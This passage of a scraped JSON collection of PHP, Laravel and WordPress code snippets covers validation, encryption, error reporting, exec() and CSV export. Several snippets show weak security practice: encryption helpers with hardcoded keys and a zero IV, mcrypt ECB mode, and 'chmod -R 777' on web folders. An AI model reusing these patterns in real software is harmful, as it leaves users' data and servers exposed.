    "description": "'email' => 'required|email|unique:users,email', //@sujay\n'user.email' => 'required|email|unique:users,email,'.$user->id, //@sujay\n# <values> = foo,bar,... # <field> = array field # <characters> = amount of characters  # accepted\t\t\t\t\t           # active_url # after:<tomorrow>\t\t\t           # after_or_equal:<tomorrow> # alpha\t\t\t\t\t\t           # alpha_dash # alpha_num\t\t\t\t\t           # array # bail \t\t\t\t\t               # before:<today> # before_or_equal:<today>              # between:min,max # boolean\t\t\t\t\t           # confirmed # date\t\t\t\t\t\t           # date_equals:<today> # date_format:<format> \t\t           # different:<name> # digits:<value>\t\t\t           # digits_between:min,max # dimensions:<min/max_with>\t           # distinct # email\t\t\t\t\t\t           # ends_with:<values> # exclude_if:<field>,<value>           # exclude_unless:<field>,<value> # exists:<table>,<column>\t           # file # filled\t\t\t\t\t           # gt:<field> # gte:<field>\t\t\t\t           # image # in:<values>\t\t\t\t           # in_array:<field> # integer\t\t\t\t\t           # ip # ipv4                                 # ipv6   # json\t\t\t\t\t\t           # lt:<field> # lte:<field>       \t\t           # max:<value> # mimetypes:video/avi,...\t           # mimes:jpeg,bmp,png # min:<value>\t\t\t\t           # not_in:<values> # not_regex:<pattern> \t\t           # nullable # numeric\t\t\t\t\t           # password:<auth guard> # present\t\t\t\t\t           # regex:<pattern> # required\t\t\t\t\t           # required_if:<field>,<value> # required_unless:<field>,<value>      # required_with:<fields> # required_with_all:<fields>\t       # required_without:<fields> # required_without_all:<fields>        # same:<field> # size:<characters>\t\t\t           # starts_with:<values> # string\t\t\t\t\t\t       # timezone # unique:<table>,<column>\t\t       # url # uuid\n       $messsages = array( \t\t'email.required'=>'You cant leave Email field empty', \t\t'name.required'=>'You cant leave name field empty',                 'name.min'=>'The field has to be :min chars long', \t);  \t$rules = array( \t\t'email'=>'required|unique:content', \t\t'name'=>'required|min:3', \t);  \t$validator = Validator::make(Input::all(), $rules,$messsages); \n$input = $request->only('account'); // dont use all(), ever              $rules = [   'account' => 'required' ];  if (filter_var($input['account'], FILTER_VALIDATE_EMAIL)) {    $rules['account'] .= '|exists:users,email';  } else {    $rules['account'] .= '|exists:users,username';  }  $messages = [   'account.required' => 'Enter username or email to login.',                 ];  $validator = Validator::make($input, $rules, $messages);            \n $validator = Validator::make($request->all(), []);   $validator->sometimes('email', 'unique:users,email', function ($input) {             return $input->email !== Auth::user()->email;         }); //@sujay\n",
    "reg_date": "2021-10-12T10:13:48.000Z"
  },
  {
    "id": 1070,
    "keyword": null,
    "link": null,
    "title": " email validation php",
    "description": "<?php    $email = \"pattrick@tutorialspoint.com\";    // Validate email    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {       echo(\"$email is a valid email address\");    }    else{       echo(\"$email is not a valid email address\");    } ?>\n$email = \"email@email.fr\";  if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {   $emailErr = \"Email invalide\"; }\nfilter_var($email, FILTER_VALIDATE_EMAIL)\n$email = $_POST[\"email\"]; if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {   $emailErr = \"Invalid email format\"; }\n// E-mail Code Validation using a four digit number:  // var.inc.php:  <?php  session_start(); $x = mt_rand(1000,9999); // index.php:  <?php  include_once 'var.inc.php'; $_SESSION['key'] = $x; if(isset($_POST['submit'])){     if(!mail($_POST['email-in'], \"Verify\", \"Code: \". $x)){         echo \"ERROR EMAIL\";     }else{         header(\"Location: validate.php\");     } } ?> <!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Validate email</title> </head>  <body>     <form action=\"\" method=\"post\">         <input type=\"email\" placeholder=\"email\" name=\"email-in\">         <button id=\"submit\" type=\"submit\" name=\"submit\">Submit</button>     </form> </body> </html> // validate.php:    <?php session_start();?> <!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Validate</title> </head> <body>     <form action=\"\" method=\"post\">         <input type=\"number\" name=\"user-key\">         <button type=\"submit\" name=\"submit-user-key\">Validate</button>     </form> </body> </html> <?php      if(isset($_POST['submit-user-key'])){         if($_POST['user-key'] == $_SESSION['key']){             //Do something         }     } ?>\n$pattern = '/^(?!(?:(?:\\\\x22?\\\\x5C[\\\\x00-\\\\x7E]\\\\x22?)|(?:\\\\x22?[^\\\\x5C\\\\x22]\\\\x22?)){255,})(?!(?:(?:\\\\x22?\\\\x5C[\\\\x00-\\\\x7E]\\\\x22?)|(?:\\\\x22?[^\\\\x5C\\\\x22]\\\\x22?)){65,}@)(?:(?:[\\\\x21\\\\x23-\\\\x27\\\\x2A\\\\x2B\\\\x2D\\\\x2F-\\\\x39\\\\x3D\\\\x3F\\\\x5E-\\\\x7E]+)|(?:\\\\x22(?:[\\\\x01-\\\\x08\\\\x0B\\\\x0C\\\\x0E-\\\\x1F\\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7F]|(?:\\\\x5C[\\\\x00-\\\\x7F]))*\\\\x22))(?:\\\\.(?:(?:[\\\\x21\\\\x23-\\\\x27\\\\x2A\\\\x2B\\\\x2D\\\\x2F-\\\\x39\\\\x3D\\\\x3F\\\\x5E-\\\\x7E]+)|(?:\\\\x22(?:[\\\\x01-\\\\x08\\\\x0B\\\\x0C\\\\x0E-\\\\x1F\\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7F]|(?:\\\\x5C[\\\\x00-\\\\x7F]))*\\\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\\\]))$/iD';  $emailaddress = 'test@gmail.com';  if (preg_match($pattern, $emailaddress) === 1) {     // emailaddress is valid } \n",
    "reg_date": "2021-10-12T10:13:48.000Z"
  },
  {
    "id": 1071,
    "keyword": null,
    "link": null,
    "title": " email verification in php",
    "description": "$email_a = 'joe@example.com'; $email_b = 'bogus';  if (filter_var($email_a, FILTER_VALIDATE_EMAIL)) {   \t//OK     echo \"L'adresse email '$email_a' est consid&eacute;r&eacute;e comme valide.\";  } if (filter_var($email_b, FILTER_VALIDATE_EMAIL)) {   \t//OK     echo \"L'adresse email '$email_b' est consid&eacute;r&eacute;e comme valide.\"; }  else {   \t// NOT OK     echo \"L'adresse email '$email_b' est consid&eacute;r&eacute;e comme invalide.\"; } ?>\n",
    "reg_date": "2021-10-12T10:13:48.000Z"
  },
  {
    "id": 1072,
    "keyword": null,
    "link": null,
    "title": " embed html page in php",
    "description": "<?php // do php stuff  include('fileOne.html'); include('fileTwo.html');  ?> \n",
    "reg_date": "2021-10-12T10:13:48.000Z"
  },
  {
    "id": 1073,
    "keyword": null,
    "link": null,
    "title": " empty table in laravel",
    "description": "MyModel::truncate();\n\\App\\Model::query()->delete();\n",
    "reg_date": "2021-10-12T10:13:48.000Z"
  },
  {
    "id": 1074,
    "keyword": null,
    "link": null,
    "title": " enable error logging php",
    "description": "ini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL);\n/usr/local/apache/logs/error_log\n",
    "reg_date": "2021-10-12T10:13:48.000Z"
  },
  {
    "id": 1075,
    "keyword": null,
    "link": null,
    "title": " enable wp debug",
    "description": "define( 'WP_DEBUG', true );\n",
    "reg_date": "2021-10-12T10:13:48.000Z"
  },
  {
    "id": 1076,
    "keyword": null,
    "link": null,
    "title": " enablequerylog laravel",
    "description": "\\DB::enableQueryLog();  dd(\\DB::getQueryLog());\n",
    "reg_date": "2021-10-12T10:13:48.000Z"
  },
  {
    "id": 1077,
    "keyword": null,
    "link": null,
    "title": " encrypt decrypt php",
    "description": "function encrypt_decrypt($string, $action = 'encrypt') {     $encrypt_method = \"AES-256-CBC\";     $secret_key = 'AA74CDCC2BBRT935136HH7B63C27'; // user define private key     $secret_iv = '5fgf5HJ5g27'; // user define secret key     $key = hash('sha256', $secret_key);     $iv = substr(hash('sha256', $secret_iv), 0, 16); // sha256 is hash_hmac_algo     if ($action == 'encrypt') {         $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);         $output = base64_encode($output);     } else if ($action == 'decrypt') {         $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);     }     return $output; }   echo \"Your Encrypted password is = \". $pwd = encrypt_decrypt('spaceo', 'encrypt'); echo \"Your Decrypted password is = \". encrypt_decrypt($pwd, 'decrypt'); \n$decoded = base64_decode($encoded); \nfunction encryptPass($password) {     $sSalt = '20adeb83e85f03cfc84d0fb7e5f4d290';     $sSalt = substr(hash('sha256', $sSalt, true), 0, 32);     $method = 'aes-256-cbc';      $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);      $encrypted = base64_encode(openssl_encrypt($password, $method, $sSalt, OPENSSL_RAW_DATA, $iv));     return $encrypted; }  function decryptPass($password) {     $sSalt = '20adeb83e85f03cfc84d0fb7e5f4d290';     $sSalt = substr(hash('sha256', $sSalt, true), 0, 32);     $method = 'aes-256-cbc';      $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);      $decrypted = openssl_decrypt(base64_decode($password), $method, $sSalt, OPENSSL_RAW_DATA, $iv);     return $decrypted; }\nfunction encryptor($action, $string) { \t$output = FALSE; \t$encrypt_method = \"AES-256-CBC\"; \t$secret_key = 'SecretKeyWord'; \t$secret_iv  = 'SecretIV@123GKrQp'; \t// hash \t$key = hash('sha256', $secret_key); \t// iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning \t$iv = substr(hash('sha256', $secret_iv), 0, 16); \t//do the encryption given text/string/number \tif ($action == 'encrypt') { \t\t$output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv); \t\t$output = base64_encode($output); \t} elseif ($action == 'decrypt') { \t\t//decrypt the given text/string/number \t\t$output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv); \t} \treturn $output; }  function encrypt($data) { \treturn urlencode(self::encryptor('encrypt', self::sanitize($data))); }  function decrypt($data) { \treturn self::encryptor('decrypt', urldecode(self::sanitize($data))); } // Now you can just call encrypt($string) or decrypt($string) ?>\nfunction encrypt($plaintext, $password) {     $method = \"AES-256-CBC\";     $key = hash('sha256', $password, true);     $iv = openssl_random_pseudo_bytes(16);      $ciphertext = openssl_encrypt($plaintext, $method, $key, OPENSSL_RAW_DATA, $iv);     $hash = hash_hmac('sha256', $ciphertext . $iv, $key, true);      return $iv . $hash . $ciphertext; }  function decrypt($ivHashCiphertext, $password) {     $method = \"AES-256-CBC\";     $iv = substr($ivHashCiphertext, 0, 16);     $hash = substr($ivHashCiphertext, 16, 32);     $ciphertext = substr($ivHashCiphertext, 48);     $key = hash('sha256', $password, true);      if (!hash_equals(hash_hmac('sha256', $ciphertext . $iv, $key, true), $hash)) return null;      return openssl_decrypt($ciphertext, $method, $key, OPENSSL_RAW_DATA, $iv); }  //Example usage: $encrypted = encrypt('Plaintext string.', 'password'); // this yields a binary string  echo decrypt($encrypted, 'password'); // decrypt($encrypted, 'wrong password') === null\n//Key $key = 'SuperSecretKey';  //To Encrypt: $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, 'I want to encrypt this', MCRYPT_MODE_ECB);  //To Decrypt: $decrypted = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $encrypted, MCRYPT_MODE_ECB); \n",
    "reg_date": "2021-10-12T10:13:48.000Z"
  },
  {
    "id": 1078,
    "keyword": null,
    "link": null,
    "title": " encryption and decryption in php example",
    "description": "function encrypt_decrypt($string, $action = 'encrypt') {     $encrypt_method = \"AES-256-CBC\";     $secret_key = 'AA74CDCC2BBRT935136HH7B63C27'; // user define private key     $secret_iv = '5fgf5HJ5g27'; // user define secret key     $key = hash('sha256', $secret_key);     $iv = substr(hash('sha256', $secret_iv), 0, 16); // sha256 is hash_hmac_algo     if ($action == 'encrypt') {         $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);         $output = base64_encode($output);     } else if ($action == 'decrypt') {         $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);     }     return $output; }   echo \"Your Encrypted password is = \". $pwd = encrypt_decrypt('spaceo', 'encrypt'); echo \"Your Decrypted password is = \". encrypt_decrypt($pwd, 'decrypt'); \n$decoded = base64_decode($encoded); \nfunction encryptPass($password) {     $sSalt = '20adeb83e85f03cfc84d0fb7e5f4d290';     $sSalt = substr(hash('sha256', $sSalt, true), 0, 32);     $method = 'aes-256-cbc';      $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);      $encrypted = base64_encode(openssl_encrypt($password, $method, $sSalt, OPENSSL_RAW_DATA, $iv));     return $encrypted; }  function decryptPass($password) {     $sSalt = '20adeb83e85f03cfc84d0fb7e5f4d290';     $sSalt = substr(hash('sha256', $sSalt, true), 0, 32);     $method = 'aes-256-cbc';      $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);      $decrypted = openssl_decrypt(base64_decode($password), $method, $sSalt, OPENSSL_RAW_DATA, $iv);     return $decrypted; }\nfunction encryptor($action, $string) { \t$output = FALSE; \t$encrypt_method = \"AES-256-CBC\"; \t$secret_key = 'SecretKeyWord'; \t$secret_iv  = 'SecretIV@123GKrQp'; \t// hash \t$key = hash('sha256', $secret_key); \t// iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning \t$iv = substr(hash('sha256', $secret_iv), 0, 16); \t//do the encryption given text/string/number \tif ($action == 'encrypt') { \t\t$output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv); \t\t$output = base64_encode($output); \t} elseif ($action == 'decrypt') { \t\t//decrypt the given text/string/number \t\t$output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv); \t} \treturn $output; }  function encrypt($data) { \treturn urlencode(self::encryptor('encrypt', self::sanitize($data))); }  function decrypt($data) { \treturn self::encryptor('decrypt', urldecode(self::sanitize($data))); } // Now you can just call encrypt($string) or decrypt($string) ?>\n",
    "reg_date": "2021-10-12T10:13:49.000Z"
  },
  {
    "id": 1079,
    "keyword": null,
    "link": null,
    "title": " encryption key has not encrypted laravel",
    "description": "php artisan key:generate php artisan serve\n",
    "reg_date": "2021-10-12T10:13:49.000Z"
  },
  {
    "id": 1080,
    "keyword": null,
    "link": null,
    "title": " end session variable php",
    "description": "// destroy the session <?php session_destroy(); ?>\n",
    "reg_date": "2021-10-12T10:13:49.000Z"
  },
  {
    "id": 1081,
    "keyword": null,
    "link": null,
    "title": " enie letter validation laravel regex",
    "description": "return [                     'fname' => 'required|max:255|regex:/^[a-zA-Z&Ntilde;&ntilde;\\s]+$/',                     'lname' => 'required|max:255|regex:/^[a-zA-Z&Ntilde;&ntilde;\\s]+$/',                     'mname' => 'max:255|alpha',                      'file' => 'image|mimes:jpg,jpeg,png',                'contact_no' => 'regex:/^[-0-9\\+]+$/',             'date_of_birth' => 'required|date_format:Y-m-d',                 'school_id' => 'required|exists:schools,id',                 'degree_id' => 'required|exists:degrees,id',         ]; \n",
    "reg_date": "2021-10-12T10:13:49.000Z"
  },
  {
    "id": 1082,
    "keyword": null,
    "link": null,
    "title": " enqueue font awesome wordpress",
    "description": "function enqueue_load_fa() {   wp_enqueue_style( 'load-fa', 'https://use.fontawesome.com/releases/v5.5.0/css/all.css' ); }  add_action( 'wp_enqueue_scripts', 'enqueue_load_fa'); \n",
    "reg_date": "2021-10-12T10:13:49.000Z"
  },
  {
    "id": 1083,
    "keyword": null,
    "link": null,
    "title": " enqueue wordpress",
    "description": "/**   *   Enqueue your theme styles and scripts in functions.php  *   use time() instead of a proper versioning to avoid caching when developing  */ function my_theme_enqueue_scripts() {     wp_enqueue_style( 'default-style', get_stylesheet_uri(), [], '1.0.0', 'all' ); //default styles.css     wp_enqueue_style( 'main-style', get_stylesheet_directory_uri() . '/assets/css/main.min.css', [], time(), 'all' );     wp_enqueue_script( 'main-script', get_stylesheet_directory_uri() . '/assets/js/main.min.js', [], time(), false ); } add_action( 'wp_enqueue_scripts', 'my_theme_enqueue_scripts' ); \nfunction wpdocs_theme_name_scripts() {     wp_enqueue_style( 'style-name', get_stylesheet_uri() ); /* enqueues style.css */     /* if you want to enqueue other styles use: */     /* wp_enqueue_style( 'style-name', get_template_directory_uri() . '/css/your-style-name.css' ); */     wp_enqueue_script( 'script-name', get_template_directory_uri() . '/js/example.js', array(), '1.0.0', true ); } add_action( 'wp_enqueue_scripts', 'wpdocs_theme_name_scripts' );\nfunction script_that_requires_jquery() {     wp_register_script( 'script-with-dependency', 'http://www.example.com/script-with-dependency.js', array( 'jquery' ), '1.0.0', true );     wp_enqueue_script( 'script-with-dependency' ); } add_action( 'wp_enqueue_scripts', 'script_that_requires_jquery' );\n",
    "reg_date": "2021-10-12T10:13:49.000Z"
  },
  {
    "id": 1084,
    "keyword": null,
    "link": null,
    "title": " env clear cache laravel",
    "description": "php artisan cache:clear php artisan config:clear php artisan route:clear \n",
    "reg_date": "2021-10-12T10:13:49.000Z"
  },
  {
    "id": 1085,
    "keyword": null,
    "link": null,
    "title": " erd in phpmyadmin",
    "description": "go to phpmyadmin click on your desired database find designer tab in the navbar (it appears usually after you click more)     if you are unable to see the relationship lines, then click on      \"toggle relationship lines\" which whill appear when you will hover      on the left icons.\n",
    "reg_date": "2021-10-12T10:13:49.000Z"
  },
  {
    "id": 1086,
    "keyword": null,
    "link": null,
    "title": " erreur php",
    "description": "<?php error_reporting(E_ALL); ygihukiygk; ?> \n",
    "reg_date": "2021-10-12T10:13:49.000Z"
  },
  {
    "id": 1087,
    "keyword": null,
    "link": null,
    "title": " errno: 150 foreign key constraint is incorrectly formed laravel 8",
    "description": "Since increments() creates an unsigned integer column, you need to define the foreign key column as unsigned integer too.  Default migrations in Laravel 6+ use bigIncrements(), so you need to use unsignedBigInteger() method:  $table->unsignedBigInteger('order_id'); https://laravel.com/docs/6.x/migrations#foreign-key-constraints  For default migrations in older versions of Laravel use unsignedInteger() method:  $table->unsignedInteger('order_id'); Or:  $table->integer('order_id')->unsigned();\n",
    "reg_date": "2021-10-12T10:13:49.000Z"
  },
  {
    "id": 1088,
    "keyword": null,
    "link": null,
    "title": " error log array",
    "description": "error_log( print_r($multidimensionalarray, TRUE) );\n",
    "reg_date": "2021-10-12T10:13:50.000Z"
  },
  {
    "id": 1089,
    "keyword": null,
    "link": null,
    "title": " error log php array",
    "description": "error_log( print_r($multidimensionalarray, TRUE) );\n",
    "reg_date": "2021-10-12T10:13:50.000Z"
  },
  {
    "id": 1090,
    "keyword": null,
    "link": null,
    "title": " error log wordpress",
    "description": "//You can enable WordPress logging adding this to wp-config.php file // Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );\nerror_log( print_r( 'Hello World!', true ) );\nerror_log( 'Hello World!' );\n",
    "reg_date": "2021-10-12T10:13:50.000Z"
  },
  {
    "id": 1091,
    "keyword": null,
    "link": null,
    "title": " error reporting in php",
    "description": "// Add these lines somewhere on top of your PHP file: ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);\nini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL);\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); \n/* Display all errors like dev */ ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /* Display PROD errors */ ini_set('display_errors', 1); ini_set('display_startup_errors', 0); error_reporting(E_ALL & ~E_NOTICE);  /* OTHER SETTINGS*/  // Report simple running errors error_reporting(E_ERROR | E_WARNING | E_PARSE);  // Reporting E_NOTICE  error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);  // Report all errors except E_NOTICE error_reporting(E_ALL & ~E_NOTICE); // For PHP < 5.3 error_reporting(E_ALL ^ E_NOTICE);  // Report all PHP errors error_reporting(E_ALL); //or error_reporting(-1); //or error_reporting(0);\n/* Answer to: \"php error reporting\" */  ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /*   What do these lines of code do exactly?    The ini_set function will try to override the configuration found   in your PHP ini file.    The display_errors and display_startup_errors are just two of the   directives that are available. The display_errors directive will   determine if the errors will be displayed or hidden to the user.   Usually, the dispay_errors directive should be turned off after   development.    The display_startup_errors, however, is a separate directive   because the display_errors doesn&rsquo;t handle the errors that will be   encountered during PHP&rsquo;s startup sequence. The list of the   directives that can be overridden by the ini_set function is found   in the official documentation. */\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); //OR ini_set('display_errors', 1); ini_set('display_startup_errors', 0); error_reporting(E_ALL & ~E_NOTICE);\n",
    "reg_date": "2021-10-12T10:13:50.000Z"
  },
  {
    "id": 1092,
    "keyword": null,
    "link": null,
    "title": " events.js:174 error discord.js",
    "description": "rm -rf node_modules rm package-lock.json yarn.lock npm cache clear --force npm install \n",
    "reg_date": "2021-10-12T10:13:50.000Z"
  },
  {
    "id": 1093,
    "keyword": null,
    "link": null,
    "title": " excel utf-8 php",
    "description": "// --- 3 rows for encoding utf-8 header('Content-Encoding: UTF-8'); // vilh, change to UTF-8! header(\"Content-type: application/x-msexcel; charset=utf-8\");  // vilh, chang fputs ($fp, \"\\xEF\\xBB\\xBF\"); // vilh, change to UTF-8!  // ------------------- header('Content-Encoding: UTF-8'); // vilh, change to UTF-8! header(\"Content-type: application/x-msexcel; charset=utf-8\");  // vilh, change to UTF-8! header('Content-Disposition: attachment; filename=\"'.$fileName.'.csv\"'); header('Cache-Control: max-age=0');  // for browser down $fp = fopen('php://output', 'a');  fputs ($fp, \"\\xEF\\xBB\\xBF\"); // vilh, change to UTF-8!  //header foreach ($headlist as $key => $value) {   $headlist[$key] = $value;\t// vilh, change to UTF-8 }  fputcsv($fp, $headlist);\nmb_convert_encoding($csv, 'UTF-16LE', 'UTF-8');\nchr(255) . chr(254)\n",
    "reg_date": "2021-10-12T10:13:50.000Z"
  },
  {
    "id": 1094,
    "keyword": null,
    "link": null,
    "title": " exceptions php",
    "description": " <?php function inverse($x) {     if (!$x) {        throw new Exception('Division durch Null.');     }     return 1/$x; }  try {     echo inverse(5) . \"\\n\";     echo inverse(0) . \"\\n\"; } catch (Exception $e) {     echo 'Exception abgefangen: ',  $e->getMessage(), \"\\n\"; }  // Ausf&uuml;hrung fortsetzen echo \"Hallo Welt\\n\"; ?>\n <?php function inverse($x) {     if (!$x) {        throw new Exception('Division durch Null.');     }     return 1/$x; }  try {     echo inverse(5) . \"\\n\";     echo inverse(0) . \"\\n\"; } catch (Exception $e) {     echo 'Exception abgefangen: ',  $e->getMessage(), \"\\n\"; }  // Ausf&uuml;hrung fortsetzen echo \"Hallo Welt\\n\"; ?>  \ntry {     // Some code... } catch(AError | BError $e) {     // Handle exceptions } catch(Exception $e) {     // Handle the general case }\n",
    "reg_date": "2021-10-12T10:13:50.000Z"
  },
  {
    "id": 1095,
    "keyword": null,
    "link": null,
    "title": " excerpt custom post type",
    "description": "Change your support field to this  'supports' => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments' ) );  Eg: <?php add_action( 'init', 'create_testimonial_posttype' ); function create_testimonial_posttype(){   register_post_type( 'testimonials',     array(       'labels' => array(         'name' => __( 'Testimonials' ),         'singular_name' => __( 'Testimonial' )       ),       'public' => true,       'has_archive' => true,       'rewrite' => array('slug' => 'clients'),       'supports' => array('title','thumbnail','editor','page-attributes','excerpt'),     )   ); } ?>\n",
    "reg_date": "2021-10-12T10:13:50.000Z"
  },
  {
    "id": 1096,
    "keyword": null,
    "link": null,
    "title": " exclude a section from blade layout",
    "description": "// Try something like this: // In your master layout...  @section('header') <header>Default Header</header> @show  // In your dashboard template (which extends master)...  @section('header') @endsection\n",
    "reg_date": "2021-10-12T10:13:50.000Z"
  },
  {
    "id": 1097,
    "keyword": null,
    "link": null,
    "title": " exec command not working in php but works in terminal",
    "description": " Things that i tried were :  1. Try executing the simple command fist and see if the out is comming.   example : system('ls -l > output.txt') // This will output the file in public      \t\t\t\t\t\t\t\t\t\t//folder 2. After that i tried giving the permission 777 to the files and folder      that require and access and create a file.     example : chmod -R 777 /var/www/html/PATH_TO_FOLDER/public        3. Search your php.ini with this commands: php --ini   For Me: Loaded Configuration File: /etc/php/7.2/cli/php.ini \tIn your php.ini file, set variables_order = \"EGPCS\".    \n",
    "reg_date": "2021-10-12T10:13:50.000Z"
  },
  {
    "id": 1098,
    "keyword": null,
    "link": null,
    "title": " exec output php",
    "description": "shell_exec('ls'); // or exec('ls');\n$output = exec('ls');\n",
    "reg_date": "2021-10-12T10:13:51.000Z"
  },
  {
    "id": 1099,
    "keyword": null,
    "link": null,
    "title": " execute sql query codeigniter",
    "description": "$query = $this->db->query('YOUR QUERY HERE'); \n",
    "reg_date": "2021-10-12T10:13:51.000Z"
  },
  {
    "id": 1100,
    "keyword": null,
    "link": null,
    "title": " explode comma php",
    "description": "$myString = \"9,admin@example.com,8\"; $myArray = explode(',', $myString); print_r($myArray);\n",
    "reg_date": "2021-10-12T10:13:51.000Z"
  },
  {
    "id": 1101,
    "keyword": null,
    "link": null,
    "title": " explode foreach",
    "description": " $var = 'a/asdas/fgdfg/zfdvs/sdfh'; $array = explode('/', $var); foreach ($array as $values) { // }  \n",
    "reg_date": "2021-10-12T10:13:51.000Z"
  },
  {
    "id": 1102,
    "keyword": null,
    "link": null,
    "title": " explode function in laravel",
    "description": " @if ($data->facings != \"\")   @foreach(explode(',', $data->facings) as $info)      <option>{{$info}}</option>   @endforeach @endif //@sujay\n$full_name = \"John Doe\"; $name = explode(' ',$full_name); $first_name = $name[0]; $last_name = $name[1]; \n",
    "reg_date": "2021-10-12T10:13:51.000Z"
  },
  {
    "id": 1103,
    "keyword": null,
    "link": null,
    "title": " explode in laravel blade",
    "description": " @if ($data->facings != \"\")   @foreach(explode(',', $data->facings) as $info)      <option>{{$info}}</option>   @endforeach @endif //@sujay\n",
    "reg_date": "2021-10-12T10:13:51.000Z"
  },
  {
    "id": 1104,
    "keyword": null,
    "link": null,
    "title": " export PATH=/Applications/MAMP/bin/php/php5.4.10/bin:$PATH",
    "description": " export PATH=/Applications/MAMP/bin/php/php5.4.10/bin:$PATH\n",
    "reg_date": "2021-10-12T10:13:51.000Z"
  },
  {
    "id": 1105,
    "keyword": null,
    "link": null,
    "title": " export data to csv in php",
    "description": "<?php    //store the data that you retrieve from DB in a varible, in my case its $keywords_analytics    if($keywords_analytics!=''){     $delimiter = \",\";     $fileName = 'search_terms.csv';        // Create a file pointer     $f = fopen('php://memory', 'w');      // Set column headers     $fields = array('Date', 'Search Term', 'Total');      fputcsv($f, $fields, $delimiter);      foreach ($keywords_analytics as $ka){         $lineData = array($ka['dated'], $ka['keyword'], $ka['total']);         fputcsv($f, $lineData, $delimiter);     }     // Move back to beginning of file     fseek($f, 0);      // Set headers to download file rather than displayed     header('Content-Type: text/csv');     header('Content-Disposition: attachment; filename=\"' . $fileName . '\";');      //output all remaining data on a file pointer     fpassthru($f); } exit; ?>\n<?php /* * iTech Empires:  Export Data from MySQL to CSV Script * Version: 1.0.0 * Page: Index */   // Database Connection require(\"db_connection.php\");   // List Users $query = \"SELECT * FROM users\"; if (!$result = mysqli_query($con, $query)) {     exit(mysqli_error($con)); }   if (mysqli_num_rows($result) > 0) {     $number = 1;     $users = '<table class=\"table table-bordered\">         <tr>             <th>No.</th>             <th>First Name</th>             <th>Last Name</th>             <th>Email</th>         </tr>     ';     while ($row = mysqli_fetch_assoc($result)) {         $users .= '<tr>             <td>'.$number.'</td>             <td>'.$row['first_name'].'</td>             <td>'.$row['last_name'].'</td>             <td>'.$row['email'].'</td>         </tr>';         $number++;     }     $users .= '</table>'; }   ?> <!doctype html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <title>Export Data from MySQL to CSV Tutorial | iTech Empires</title>     